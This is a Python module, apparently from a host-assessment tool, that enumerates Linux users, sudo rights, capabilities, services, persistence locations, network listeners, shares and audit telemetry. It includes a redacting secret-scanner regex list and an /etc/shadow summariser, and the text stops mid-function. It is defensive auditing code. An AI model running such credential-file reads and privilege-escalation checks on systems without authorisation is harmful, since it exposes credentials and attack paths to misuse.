"""The Linux implementation of the verb catalogue.

Every verb in :mod:`whetstone.verbs` is a *question*; this module is Linux's
answer to each one, phrased in Linux's own idioms. ``enum.persistence`` becomes a
sweep of systemd units and timers, cron, ``/etc/rc.local``, shell profiles and
``~/.config/autostart``; ``enum.services`` becomes ``systemctl``; the credential
store is ``/etc/shadow``. The model never learns any of that — it learns the
question and this file carries the dialect, which is the whole point of the
adapter layer (see :mod:`whetstone.adapters.base`).

Two design rules run through the file and are worth stating before the code:

**Parsing is separated from execution, ruthlessly.** Every command's output is
turned into structured data by a *pure, module-level function* — ``parse_ss``,
``parse_passwd``, ``summarize_shadow`` and so on. The handler's job is only to
run the command and hand its stdout to the parser. This is not tidiness for its
own sake: it is the only way a Linux adapter gets *tested on a Mac*. The parsers
are exercised below (:func:`_run_self_tests`) against captured fixture output
that a real Linux box produced, with no Linux kernel in sight. A parser that
could only be run on Linux would be untestable in this project's CI, which runs
wherever a contributor happens to be.

**Reading /proc beats shelling out.** Where a fact lives in ``/proc`` — process
trees, capabilities, the current identity's rights — this reads the file
directly rather than parsing ``ps``. It is faster, it does not depend on which
``ps`` flavour is installed, and ``/proc/<pid>/stat`` does not reflow when
someone's terminal is narrow. ``ps`` output is a UI; ``/proc`` is an API.

One honesty rule deserves its own mention because a whole finding rests on it:
:func:`assess_telemetry` distinguishes *auditd installed* from *auditd running*.
An audit ruleset sitting in ``/etc/audit/rules.d`` while the daemon is stopped
enforces nothing, and reporting those rules as live telemetry would be a lie that
the detection-gap analysis would then inherit. "Installed but stopped" is the
common real-world case, so it is called out explicitly rather than folded into
"present".
"""

from __future__ import annotations

import os
import re
import shlex
import socket
import stat as statmod
import tempfile
import time
from pathlib import Path
from typing import Any, Iterable

from ..actions import Action, Observation, Verb
from .base import (
    Adapter,
    AdapterError,
    CommandResult,
    register_adapter,
    run,
    which,
)

# ===========================================================================
# Pure parsers.  Each turns a command's stdout (a string) into structured data.
# They are module-level and importable so they can be fixture-tested off-Linux;
# see _run_self_tests() at the bottom of the file.
# ===========================================================================


def parse_os_release(text: str) -> dict[str, str]:
    """Parse ``/etc/os-release`` into a flat dict.

    The file is shell-style ``KEY="value"`` assignments. We are not a shell, so
    we do the minimal unquoting ourselves rather than sourcing it — sourcing an
    attacker-controlled ``os-release`` would be exactly the command-execution
    hole this project exists to avoid.
    """
    out: dict[str, str] = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, val = line.partition("=")
        key = key.strip()
        val = val.strip()
        if len(val) >= 2 and val[0] == val[-1] and val[0] in "\"'":
            val = val[1:-1]
        out[key] = val
    return out


def parse_proc_version(text: str) -> dict[str, str]:
    """Pull the kernel version and compiler out of ``/proc/version``.

    Format is free text: ``Linux version 6.1.0-18-amd64 (debian-kernel@...)
    (gcc ...) #1 SMP ...``. We extract only the version token robustly and keep
    the rest as ``build`` for a human.
    """
    text = text.strip()
    out: dict[str, str] = {"raw": text}
    m = re.match(r"Linux version (\S+)", text)
    if m:
        out["kernel"] = m.group(1)
    return out


def parse_uname(text: str) -> dict[str, str]:
    """Parse ``uname -s -n -r -m -o`` (space-separated, that field order).

    ``-o`` (operating system) can itself contain a space ("GNU/Linux" does not,
    but we are defensive), so only the first four fields are split off and the
    remainder is the OS string.
    """
    parts = text.split()
    out: dict[str, str] = {}
    keys = ["sysname", "nodename", "release", "machine"]
    for i, k in enumerate(keys):
        if i < len(parts):
            out[k] = parts[i]
    if len(parts) > 4:
        out["operating_system"] = " ".join(parts[4:])
    return out


def parse_hostnamectl(text: str) -> dict[str, str]:
    """Parse ``hostnamectl`` key/value output.

    Lines are ``   Static hostname: box`` — a label, a colon, a value, with the
    label indented and multi-word. We split on the first colon and normalise the
    label to a snake_case key.
    """
    out: dict[str, str] = {}
    for line in text.splitlines():
        if ":" not in line:
            continue
        label, _, val = line.partition(":")
        key = label.strip().lower().replace(" ", "_")
        val = val.strip()
        if key and val:
            out[key] = val
    return out


def parse_passwd(text: str, *, include_disabled: bool = False) -> list[dict[str, Any]]:
    """Parse ``/etc/passwd`` (or ``getent passwd``) into account records.

    A "disabled" login here means a shell of ``/usr/sbin/nologin``/``/bin/false``
    or an empty shell — the pragmatic definition an operator uses when triaging
    who can actually log in. UIDs below 1000 (and the 65534 ``nobody``) are
    flagged ``system`` because that is the Debian/RH convention and it is what a
    reader wants to filter on.
    """
    disabled_shells = {"/usr/sbin/nologin", "/sbin/nologin", "/bin/false",
                       "/usr/bin/false", ""}
    out: list[dict[str, Any]] = []
    for line in text.splitlines():
        line = line.rstrip("\n")
        if not line or line.startswith("#"):
            continue
        fields = line.split(":")
        if len(fields) < 7:
            continue
        name, _pw, uid, gid, gecos, home, shell = fields[:7]
        try:
            uid_i = int(uid)
            gid_i = int(gid)
        except ValueError:
            continue
        disabled = shell in disabled_shells
        rec = {
            "name": name,
            "uid": uid_i,
            "gid": gid_i,
            "gecos": gecos,
            "home": home,
            "shell": shell,
            "system": uid_i < 1000 or uid_i == 65534,
            "login_disabled": disabled,
        }
        if disabled and not include_disabled:
            continue
        out.append(rec)
    return out


def parse_getent_group(text: str) -> tuple[list[dict[str, Any]], dict[str, list[str]]]:
    """Parse ``getent group`` into (groups, user->groups).

    Returns both directions because callers want each: the group list for
    ``enum.users`` group membership, and the reverse map to answer "what groups
    is alice in" without re-scanning. The secondary-membership list in field 4 is
    the only source of supplementary groups here; a user's *primary* group (their
    passwd gid) is folded in by the caller, which is the only place that knows it.
    """
    groups: list[dict[str, Any]] = []
    user_groups: dict[str, list[str]] = {}
    for line in text.splitlines():
        if not line or line.startswith("#"):
            continue
        fields = line.split(":")
        if len(fields) < 4:
            continue
        gname, _pw, gid, members = fields[:4]
        member_list = [m for m in members.split(",") if m]
        try:
            gid_i = int(gid)
        except ValueError:
            continue
        groups.append({"name": gname, "gid": gid_i, "members": member_list})
        for m in member_list:
            user_groups.setdefault(m, []).append(gname)
    return groups, user_groups


_ID_RE = re.compile(r"(\w+)=(\d+)\(([^)]*)\)")
_ID_GROUPS_RE = re.compile(r"groups=([^ ]+)")


def parse_id(text: str) -> dict[str, Any]:
    """Parse the output of ``id`` into uid/gid/euid and the full group list.

    ``id`` prints ``uid=1000(kali) gid=1000(kali) euid=0(root) groups=...``. The
    per-item ``num(name)`` shape is regular enough to regex; the ``groups=`` list
    is comma-separated ``num(name)`` items.
    """
    out: dict[str, Any] = {"groups": []}
    for key, num, name in _ID_RE.findall(text):
        if key in {"uid", "gid", "euid", "egid"}:
            out[key] = {"id": int(num), "name": name}
    gm = _ID_GROUPS_RE.search(text)
    if gm:
        for item in gm.group(1).split(","):
            m = re.match(r"(\d+)\(([^)]*)\)", item)
            if m:
                out["groups"].append({"id": int(m.group(1)), "name": m.group(2)})
    return out


def parse_sudo_l(text: str) -> dict[str, Any]:
    """Parse ``sudo -ln`` (non-interactive list) into structured entitlements.

    The interesting facts for privilege analysis are: may this identity run
    anything (``(ALL : ALL) ALL``), and can any of it be run without a password
    (``NOPASSWD:``) — the latter is the difference between "needs the user's
    password" and "a foothold as this user is already root". We keep each rule
    line with those two flags rather than trying to model sudoers fully.
    """
    entries: list[dict[str, Any]] = []
    full_root = False
    nopasswd_any = False
    in_cmds = False
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        low = line.lower()
        if "may run the following commands" in low:
            in_cmds = True
            continue
        if not in_cmds:
            continue
        # A rule line looks like "(runas) [NOPASSWD:] command[, command...]".
        runas = ""
        rm = re.match(r"\(([^)]*)\)\s*(.*)$", line)
        rest = line
        if rm:
            runas = rm.group(1).strip()
            rest = rm.group(2).strip()
        nopasswd = "NOPASSWD:" in rest
        rest_clean = rest.replace("NOPASSWD:", "").replace("PASSWD:", "").strip()
        cmds = [c.strip() for c in rest_clean.split(",") if c.strip()]
        if nopasswd:
            nopasswd_any = True
        if "ALL" in cmds and ("ALL" in runas or "root" in runas or runas == ""):
            full_root = True
        entries.append({"runas": runas, "nopasswd": nopasswd, "commands": cmds})
    return {"entries": entries, "full_root": full_root, "nopasswd_any": nopasswd_any}


# Linux capability names indexed by bit position, CAP_CHOWN(0)..CAP_CHECKPOINT_RESTORE(40).
_CAP_NAMES = (
    "chown", "dac_override", "dac_read_search", "fowner", "fsetid", "kill",
    "setgid", "setuid", "setpcap", "linux_immutable", "net_bind_service",
    "net_broadcast", "net_admin", "net_raw", "ipc_lock", "ipc_owner",
    "sys_module", "sys_rawio", "sys_chroot", "sys_ptrace", "sys_pacct",
    "sys_admin", "sys_boot", "sys_nice", "sys_resource", "sys_time",
    "sys_tty_config", "mknod", "lease", "audit_write", "audit_control",
    "setfcap", "mac_override", "mac_admin", "syslog", "wake_alarm",
    "block_suspend", "audit_read", "perfmon", "bpf", "checkpoint_restore",
)

# Capabilities that hand out (or trivially lead to) root. Flagged so a reader
# does not have to know which of 41 abstract bits actually matters.
_CAP_DANGEROUS = frozenset({
    "sys_admin", "sys_ptrace", "sys_module", "dac_override", "dac_read_search",
    "setuid", "setgid", "sys_rawio", "net_admin", "net_raw", "chown", "fowner",
    "mac_admin", "mac_override", "bpf", "perfmon", "sys_boot",
})


def decode_caps(hexmask: str) -> list[str]:
    """Turn a ``/proc/<pid>/status`` capability hex mask into capability names.

    ``CapEff: 000001ffffffffff`` is a bitmask; bit *n* set means capability *n*
    is held. We name only bits we know; a bit past the table (a capability newer
    than this list) is reported as ``cap_N`` rather than dropped, so a future
    kernel does not silently hide a held privilege.
    """
    try:
        value = int(hexmask, 16)
    except (ValueError, TypeError):
        return []
    out: list[str] = []
    bit = 0
    while value:
        if value & 1:
            out.append(_CAP_NAMES[bit] if bit < len(_CAP_NAMES) else f"cap_{bit}")
        value >>= 1
        bit += 1
    return out


def parse_proc_status(text: str) -> dict[str, Any]:
    """Parse ``/proc/<pid>/status`` (the ``Key:\\tValue`` file).

    Only the fields that matter to enumeration are lifted out: the name, the real
    and effective uid/gid (field is ``real eff saved fs``), the effective
    capability mask decoded to names, and the seccomp mode. Everything else is
    left on the floor deliberately — a smaller dict is a cheaper observation.
    """
    fields: dict[str, str] = {}
    for line in text.splitlines():
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        fields[key.strip()] = val.strip()

    out: dict[str, Any] = {}
    if "Name" in fields:
        out["name"] = fields["Name"]
    if "State" in fields:
        out["state"] = fields["State"]
    if "PPid" in fields:
        try:
            out["ppid"] = int(fields["PPid"])
        except ValueError:
            pass
    for label, key in (("Uid", "uid"), ("Gid", "gid")):
        if label in fields:
            nums = fields[label].split()
            if nums:
                try:
                    out[key] = {
                        "real": int(nums[0]),
                        "effective": int(nums[1]) if len(nums) > 1 else int(nums[0]),
                    }
                except ValueError:
                    pass
    if "CapEff" in fields:
        out["cap_effective"] = decode_caps(fields["CapEff"])
    if "Seccomp" in fields:
        out["seccomp"] = fields["Seccomp"]
    return out


def parse_proc_stat(text: str) -> dict[str, Any]:
    """Parse ``/proc/<pid>/stat`` — pid, comm, state, ppid.

    The comm field (field 2) is wrapped in parentheses and *may itself contain
    spaces and parentheses* — a process can be named ``(my cursed )( name)``.
    Splitting on whitespace therefore corrupts on exactly the processes worth
    looking at. The robust rule is: pid is before the first ``(``, comm is
    between the first ``(`` and the *last* ``)``, and the space-delimited fields
    after that last ``)`` are state, ppid, ... .
    """
    text = text.strip()
    lp = text.find("(")
    rp = text.rfind(")")
    if lp == -1 or rp == -1 or rp < lp:
        return {}
    out: dict[str, Any] = {}
    try:
        out["pid"] = int(text[:lp].strip())
    except ValueError:
        return {}
    out["comm"] = text[lp + 1:rp]
    rest = text[rp + 1:].split()
    if rest:
        out["state"] = rest[0]
    if len(rest) > 1:
        try:
            out["ppid"] = int(rest[1])
        except ValueError:
            pass
    return out


def parse_proc_cmdline(raw: str) -> list[str]:
    """Split ``/proc/<pid>/cmdline`` (NUL-delimited argv) into a list.

    Kernel threads and some daemons expose an empty cmdline; the caller falls
    back to the ``comm`` from stat in that case, which is why an empty list here
    is a legitimate answer rather than an error.
    """
    return [a for a in raw.split("\x00") if a]


def parse_systemctl_units(text: str) -> list[dict[str, str]]:
    """Parse ``systemctl list-units --type=service --all --plain``.

    Columns are ``UNIT LOAD ACTIVE SUB DESCRIPTION``; only the first four are
    single tokens, the description is free text, so we split at most four times.
    A leading bullet (``●``/``*``) marks a failed unit in some versions even with
    ``--plain``; it is stripped. Header and legend lines (they contain no
    ``.service`` unit or are the column header) are skipped.
    """
    out: list[dict[str, str]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line and line[0] in "\u25cf*\u2714\u2718":
            line = line[1:].strip()
        if line.startswith("UNIT ") or line.startswith("UNIT\t"):
            continue
        # Legend/footer lines from `systemctl` are sentences, not unit rows.
        if "loaded units listed" in line or "LOAD   =" in line or line.startswith("To show"):
            continue
        parts = line.split(None, 4)
        if len(parts) < 4:
            continue
        unit = parts[0]
        if ".service" not in unit and "@" not in unit:
            # Not a service row (could be a stray legend line).
            if not unit.endswith((".service",)):
                continue
        out.append({
            "unit": unit,
            "load": parts[1],
            "active": parts[2],
            "sub": parts[3],
            "description": parts[4] if len(parts) > 4 else "",
        })
    return out


def parse_systemctl_unit_files(text: str) -> dict[str, str]:
    """Parse ``systemctl list-unit-files --type=service --plain`` -> unit->state.

    The "state" here is the *start type* — ``enabled``, ``disabled``, ``static``,
    ``masked`` — which is a different fact from whether the unit is currently
    active, and the one ``enum.services`` reports as ``start_type``.
    """
    out: dict[str, str] = {}
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("UNIT FILE"):
            continue
        parts = line.split()
        if len(parts) < 2 or not parts[0].endswith(".service"):
            continue
        out[parts[0]] = parts[1]
    return out


def parse_systemctl_show(text: str) -> list[dict[str, str]]:
    """Parse ``systemctl show '*.service' -p Id -p ExecStart -p FragmentPath ...``.

    ``systemctl show`` prints one ``Key=Value`` block per unit, blocks separated
    by a blank line. ``ExecStart`` is a compound value of the form
    ``{ path=/usr/sbin/sshd ; argv[]=... ; ... }``; the only piece we want from
    it is ``path=``, i.e. the binary that actually runs, so we lift that out and
    drop the rest.
    """
    records: list[dict[str, str]] = []
    cur: dict[str, str] = {}
    for line in text.splitlines():
        if not line.strip():
            if cur:
                records.append(cur)
                cur = {}
            continue
        if "=" not in line:
            continue
        key, _, val = line.partition("=")
        cur[key.strip()] = val.strip()
    if cur:
        records.append(cur)

    out: list[dict[str, str]] = []
    for rec in records:
        exec_path = ""
        es = rec.get("ExecStart", "")
        m = re.search(r"path=(\S+)", es)
        if m:
            exec_path = m.group(1)
        elif es and es not in {"", "{ }"}:
            exec_path = es.split()[0]
        out.append({
            "unit": rec.get("Id", ""),
            "exec_start": exec_path,
            "fragment_path": rec.get("FragmentPath", ""),
            "start_type": rec.get("UnitFileState", ""),
            "active": rec.get("ActiveState", ""),
            "sub": rec.get("SubState", ""),
        })
    return [r for r in out if r["unit"]]


def parse_crontab(text: str, *, system: bool = False) -> list[dict[str, str]]:
    """Parse a crontab file into schedule/command records.

    ``system`` selects the six-field ``/etc/crontab`` and ``/etc/cron.d`` layout
    (which carries a *user* column between the schedule and the command) versus
    the five-field per-user ``crontab -l`` layout (which does not — the user is
    implicit). ``VAR=value`` environment lines and comments are skipped; ``@``
    shortcuts (``@reboot``, ``@daily``) are a single-token schedule.
    """
    out: list[dict[str, str]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        # Environment assignment: NAME=value with no spaces before '='.
        if re.match(r"^\w+\s*=", line) and not line.startswith("@"):
            continue
        if line.startswith("@"):
            parts = line.split(None, 2) if system else line.split(None, 1)
            schedule = parts[0]
            if system:
                user = parts[1] if len(parts) > 1 else ""
                command = parts[2] if len(parts) > 2 else ""
            else:
                user = ""
                command = parts[1] if len(parts) > 1 else ""
        else:
            n = 6 if system else 5
            parts = line.split(None, n)
            if len(parts) <= 5:
                continue
            schedule = " ".join(parts[:5])
            if system:
                user = parts[5] if len(parts) > 5 else ""
                command = parts[6] if len(parts) > 6 else ""
            else:
                user = ""
                command = parts[5] if len(parts) > 5 else ""
        out.append({"schedule": schedule, "user": user, "command": command})
    return out


def parse_desktop_autostart(text: str) -> dict[str, Any]:
    """Parse a ``~/.config/autostart`` (freedesktop ``.desktop``) file.

    A ``.desktop`` entry with ``Hidden=true`` or
    ``X-GNOME-Autostart-enabled=false`` is present but *disabled*; reporting it as
    an active autostart would be wrong, so those flags are surfaced and folded
    into an ``enabled`` boolean.
    """
    name = exec_ = ""
    enabled = True
    in_entry = False
    for raw in text.splitlines():
        line = raw.strip()
        if line.startswith("[") and line.endswith("]"):
            in_entry = line == "[Desktop Entry]"
            continue
        if not in_entry or "=" not in line:
            continue
        key, _, val = line.partition("=")
        key = key.strip()
        val = val.strip()
        if key == "Name" and not name:
            name = val
        elif key == "Exec":
            exec_ = val
        elif key == "Hidden" and val.lower() == "true":
            enabled = False
        elif key == "X-GNOME-Autostart-enabled" and val.lower() == "false":
            enabled = False
    return {"name": name, "exec": exec_, "enabled": enabled}


_SS_PROC_RE = re.compile(r'\("([^"]+)",pid=(\d+),fd=\d+\)')


def parse_ss(text: str) -> list[dict[str, Any]]:
    """Parse ``ss -tulpnH`` (headerless) into socket records.

    Columns: ``Netid State Recv-Q Send-Q Local:Port Peer:Port [Process]``. The
    address/port split is on the *last* colon so IPv6 literals
    (``[::]:22``) survive. The process column is ``users:(("sshd",pid=812,fd=3))``
    and may name several holders; we pull every ``(name,pid)`` out of it. The
    owning process is exactly what makes a listening port actionable rather than
    just present, which is why we go to the trouble.
    """
    out: list[dict[str, Any]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        cols = line.split()
        if len(cols) < 5:
            continue
        netid, state, _rq, _sq, local = cols[:5]
        peer = cols[5] if len(cols) > 5 else ""
        proc_blob = " ".join(cols[6:]) if len(cols) > 6 else ""
        addr, _, port = local.rpartition(":")
        procs = [{"name": n, "pid": int(p)} for n, p in _SS_PROC_RE.findall(proc_blob)]
        out.append({
            "proto": netid,
            "state": state,
            "local_address": addr,
            "local_port": port,
            "peer": peer,
            "processes": procs,
        })
    return out


def parse_netstat(text: str) -> list[dict[str, Any]]:
    """Parse ``netstat -tulpn`` — the fallback when ``ss`` is absent.

    Older or minimal boxes may lack ``ss``; ``netstat`` gives the same facts in a
    clumsier layout: ``Proto Recv-Q Send-Q Local Foreign State PID/Program``.
    UDP rows have no state column, so the PID/program token is located by its
    ``pid/name`` shape rather than by a fixed index.
    """
    out: list[dict[str, Any]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith(("Active", "Proto")):
            continue
        cols = line.split()
        if len(cols) < 5 or not cols[0].startswith(("tcp", "udp")):
            continue
        proto = cols[0]
        local = cols[3]
        peer = cols[4]
        state = ""
        proc = ""
        for tok in cols[5:]:
            if "/" in tok and tok.split("/")[0].isdigit():
                proc = tok
            elif tok.isupper():
                state = tok
        addr, _, port = local.rpartition(":")
        procs = []
        if proc:
            pid, _, name = proc.partition("/")
            procs = [{"name": name, "pid": int(pid)}]
        out.append({
            "proto": proto,
            "state": state,
            "local_address": addr,
            "local_port": port,
            "peer": peer,
            "processes": procs,
        })
    return out


def parse_ip_addr(text: str) -> list[dict[str, str]]:
    """Parse ``ip -o addr show`` into ``{iface, family, address}`` records."""
    out: list[dict[str, str]] = []
    for line in text.splitlines():
        parts = line.split()
        if len(parts) < 4:
            continue
        iface = parts[1]
        family = parts[2]  # inet / inet6
        addr = parts[3]
        if family not in {"inet", "inet6"}:
            continue
        out.append({"iface": iface, "family": family, "address": addr})
    return out


def parse_ip_route(text: str) -> list[dict[str, str]]:
    """Parse ``ip -o route`` into ``{destination, via, dev}`` records."""
    out: list[dict[str, str]] = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        toks = line.split()
        dest = toks[0]
        via = ""
        dev = ""
        for i, t in enumerate(toks):
            if t == "via" and i + 1 < len(toks):
                via = toks[i + 1]
            elif t == "dev" and i + 1 < len(toks):
                dev = toks[i + 1]
        out.append({"destination": dest, "via": via, "dev": dev})
    return out


def parse_dpkg_query(text: str) -> list[dict[str, str]]:
    """Parse ``dpkg-query -W -f='${Package}\\t${Version}\\t${Architecture}\\t${db:Status-Abbrev}\\n'``.

    The status-abbrev is a three-char code; ``ii`` means installed-and-configured.
    We keep the raw code and a derived ``installed`` boolean so a half-installed
    package (``iF``, ``rc``) is visible rather than counted as present.
    """
    out: list[dict[str, str]] = []
    for line in text.splitlines():
        if not line.strip():
            continue
        cols = line.split("\t")
        if len(cols) < 3:
            continue
        name, version, arch = cols[0], cols[1], cols[2]
        status = cols[3].strip() if len(cols) > 3 else ""
        out.append({
            "name": name,
            "version": version,
            "arch": arch,
            "installed": status.startswith("ii") or status == "installed",
        })
    return out


def parse_rpm_qa(text: str) -> list[dict[str, str]]:
    """Parse ``rpm -qa --qf '%{NAME}\\t%{VERSION}-%{RELEASE}\\t%{ARCH}\\n'``."""
    out: list[dict[str, str]] = []
    for line in text.splitlines():
        if not line.strip():
            continue
        cols = line.split("\t")
        if len(cols) < 2:
            continue
        out.append({
            "name": cols[0],
            "version": cols[1],
            "arch": cols[2] if len(cols) > 2 else "",
            "installed": True,
        })
    return out


def parse_exports(text: str) -> list[dict[str, Any]]:
    """Parse ``/etc/exports`` (NFS) into export records.

    Format: ``<path> <client>(<opts>) <client>(<opts>) ...``, where a path with
    spaces is double-quoted. ``no_root_squash`` is the option worth noticing —
    it lets a remote root be local root on the share — so it is preserved in the
    per-client option list rather than summarised away.
    """
    out: list[dict[str, Any]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if line.startswith('"'):
            end = line.find('"', 1)
            if end == -1:
                continue
            path = line[1:end]
            remainder = line[end + 1:].strip()
        else:
            path, _, remainder = line.partition(" ")
            remainder = remainder.strip()
        clients: list[dict[str, Any]] = []
        for tok in remainder.split():
            m = re.match(r"([^(]*)\(([^)]*)\)", tok)
            if m:
                host = m.group(1) or "*"
                opts = [o for o in m.group(2).split(",") if o]
            else:
                host = tok
                opts = []
            clients.append({"host": host, "options": opts})
        out.append({"path": path, "clients": clients})
    return out


def parse_smb_conf(text: str) -> list[dict[str, Any]]:
    """Parse ``smb.conf`` share sections (everything but ``[global]``).

    Samba keys are case- and space-insensitive (``read only``, ``readonly`` and
    ``Read Only`` are the same key), so keys are normalised to lower-case,
    spaces stripped, before being stored. ``guest ok = yes`` and
    ``read only = no`` are the access facts a reviewer wants, so they are kept
    verbatim in the options dict.
    """
    shares: list[dict[str, Any]] = []
    cur: dict[str, Any] | None = None
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line[0] in "#;":
            continue
        if line.startswith("[") and line.endswith("]"):
            section = line[1:-1].strip()
            if cur is not None:
                shares.append(cur)
            if section.lower() == "global":
                cur = None
            else:
                cur = {"name": section, "path": "", "options": {}}
            continue
        if cur is None or "=" not in line:
            continue
        key, _, val = line.partition("=")
        norm = key.strip().lower().replace(" ", "")
        val = val.strip()
        if norm == "path":
            cur["path"] = val
        else:
            cur["options"][norm] = val
    if cur is not None:
        shares.append(cur)
    return shares


def parse_auditctl_l(text: str) -> list[dict[str, Any]]:
    """Parse ``auditctl -l`` into rule records.

    Two rule shapes matter: file watches (``-w /etc/shadow -p wa -k identity``)
    and syscall rules (``-a always,exit -F arch=b64 -S execve -k exec``). We keep
    the raw rule for a human and extract the watched path, the syscalls, and the
    ``-k`` key, because the key is how ``detect.*`` later asks "did the rule tagged
    ``exec`` fire".
    """
    out: list[dict[str, Any]] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("No rules"):
            continue
        toks = line.split()
        watch = ""
        key = ""
        syscalls: list[str] = []
        i = 0
        while i < len(toks):
            t = toks[i]
            if t in {"-w", "-W"} and i + 1 < len(toks):
                watch = toks[i + 1]
                i += 2
                continue
            if t in {"-k", "-F"} and i + 1 < len(toks):
                if t == "-k":
                    key = toks[i + 1]
                elif toks[i + 1].startswith("key="):
                    key = toks[i + 1][4:]
                i += 2
                continue
            if t == "-S" and i + 1 < len(toks):
                syscalls.extend(toks[i + 1].split(","))
                i += 2
                continue
            i += 1
        out.append({"raw": line, "watch": watch, "key": key, "syscalls": syscalls})
    return out


def parse_systemctl_is_active(text: str) -> bool:
    """``systemctl is-active`` prints ``active`` / ``inactive`` / ``failed``."""
    return text.strip() == "active"


# ---- credentials / secret scanning -----------------------------------------

# Patterns for credential material in text. Each captures a *label*, never the
# secret — the whole point of redaction is that the finding names where a secret
# is without copying it somewhere new. The value groups exist only so their
# length can be reported; the value itself is dropped.
_SECRET_PATTERNS: tuple[tuple[str, "re.Pattern[str]"], ...] = (
    ("private_key_block", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    ("aws_access_key_id", re.compile(r"\b(AKIA[0-9A-Z]{16})\b")),
    ("aws_secret_access_key", re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*(\S+)")),
    ("password_assignment", re.compile(r"(?i)\b(?:password|passwd|pwd)\s*[=:]\s*(\S+)")),
    ("api_key_assignment", re.compile(r"(?i)\b(?:api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]\s*(\S+)")),
    ("bearer_token", re.compile(r"(?i)bearer\s+([A-Za-z0-9._\-]{12,})")),
    ("connection_string_password", re.compile(r"://[^:/@\s]+:([^@/\s]+)@")),
)

# Assignments whose "secret" is obviously a placeholder are noise, not findings.
_SECRET_PLACEHOLDERS = frozenset({
    "", "''", '""', "x", "changeme", "password", "your_password", "yourpassword",
    "none", "null", "example", "placeholder", "<password>", "*", "-",
})


def find_secrets(text: str, source: str) -> list[dict[str, Any]]:
    """Scan text for credential material, returning redacted findings.

    The contract that matters: **the secret value never appears in the output.**
    A finding carries the source, the kind, the line number and the length of the
    matched value — enough for a human to go look, nothing that turns the audit
    log into a second copy of the credential. Obvious placeholders
    (``password=changeme``) are dropped so the signal is not buried in template
    defaults.
    """
    out: list[dict[str, Any]] = []
    for lineno, line in enumerate(text.splitlines(), start=1):
        for kind, pat in _SECRET_PATTERNS:
            m = pat.search(line)
            if not m:
                continue
            captured = bool(m.groups())
            value = m.group(1) if captured else ""
            # The placeholder filter only makes sense for the ``key=value`` patterns
            # that CAPTURE the secret (``password=changeme``). A marker pattern —
            # the private-key BEGIN line — has no capture group, so ``value`` is the
            # empty string, and "" is the first entry in _SECRET_PLACEHOLDERS. The
            # old unconditional check therefore matched every private-key hit as a
            # placeholder and dropped it, so the highest-severity credential kind
            # was silently invisible on Linux (macOS reported it). Gate the filter
            # on there actually being a captured value so a marker is always kept.
            if captured and value.strip().strip("'\"").lower() in _SECRET_PLACEHOLDERS:
                continue
            out.append({
                "source": source,
                "kind": kind,
                "line": lineno,
                # A marker pattern captures nothing, so report the length of the
                # whole match rather than 0 — a zero here would read as "an
                # empty secret", which is not what "a private key is present" means.
                "value_length": len(value) if captured else len(m.group(0)),
                "value": "***redacted***",
            })
    return out


def summarize_shadow(text: str, *, redact: bool = True) -> dict[str, Any]:
    """Summarise ``/etc/shadow`` — which accounts have a usable password hash.

    Hash-scheme prefixes: ``$1$`` MD5, ``$2*$`` bcrypt, ``$5$`` SHA-256,
    ``$6$`` SHA-512, ``$y$``/``$gy$`` yescrypt, ``$7$`` scrypt. A field of ``!``,
    ``*``, ``!!`` or ``!$...`` means locked / login disabled — no *usable*
    password — which is a materially different fact from "no hash at all" (an
    empty field, which permits passwordless login and is flagged separately).

    With ``redact=True`` (the default, and what the verb forces unless an operator
    deliberately turns it off) the returned accounts carry the *scheme* and lock
    state but never the hash. ``redact=False`` includes the raw hash, and the
    caller is then responsible for treating its own output as a credential store.
    """
    scheme = {
        "1": "md5crypt", "2": "bcrypt", "2a": "bcrypt", "2b": "bcrypt",
        "2y": "bcrypt", "5": "sha256crypt", "6": "sha512crypt",
        "7": "scrypt", "y": "yescrypt", "gy": "gost-yescrypt",
    }
    accounts: list[dict[str, Any]] = []
    hashed = 0
    empty = 0
    for raw in text.splitlines():
        if not raw or raw.startswith("#"):
            continue
        fields = raw.split(":")
        if len(fields) < 2:
            continue
        user, pw = fields[0], fields[1]
        rec: dict[str, Any] = {"user": user}
        if pw in {"", } :
            rec["state"] = "empty_password"
            empty += 1
        elif pw[0] in "!*" or pw.startswith("!!"):
            rec["state"] = "locked"
        elif pw.startswith("$"):
            algo_id = pw.split("$")[1] if len(pw.split("$")) > 1 else ""
            rec["state"] = "hashed"
            rec["scheme"] = scheme.get(algo_id, f"unknown(${algo_id}$)")
            hashed += 1
            if not redact:
                rec["hash"] = pw
        else:
            rec["state"] = "other"
        accounts.append(rec)
    return {
        "accounts": accounts,
        "hashed_count": hashed,
        "empty_password_count": empty,
        "redacted": redact,
    }


def assess_telemetry(
    *,
    auditd_installed: bool,
    auditd_running: bool,
    auditctl_rules: str,
    rulesd_files: Iterable[str],
    journald_running: bool,
    journald_persistent: bool,
    rsyslog_running: bool,
) -> dict[str, Any]:
    """Decide what logging *actually works* on this host, not what is installed.

    This is the function the whole detection-gap story rests on, so the honesty
    rule is enforced here rather than assumed by callers: **auditd rules only
    count as telemetry when the daemon is running.** A ruleset configured in
    ``/etc/audit/rules.d`` on a box where ``auditd`` is stopped enforces nothing
    — the ``auditd installed but not running`` case, which is depressingly common
    — and this reports that as a gap, not as present telemetry. Calling those
    rules "enabled" would make every subsequent "technique X went undetected"
    finding rest on a false premise.
    """
    live_rules = parse_auditctl_l(auditctl_rules) if auditd_running else []
    configured = list(rulesd_files)
    gaps: list[str] = []

    if not auditd_installed:
        process_auditing = False
        gaps.append("auditd is not installed: no syscall-level (execve) auditing "
                    "is possible; process-creation detection will be blind.")
    elif not auditd_running:
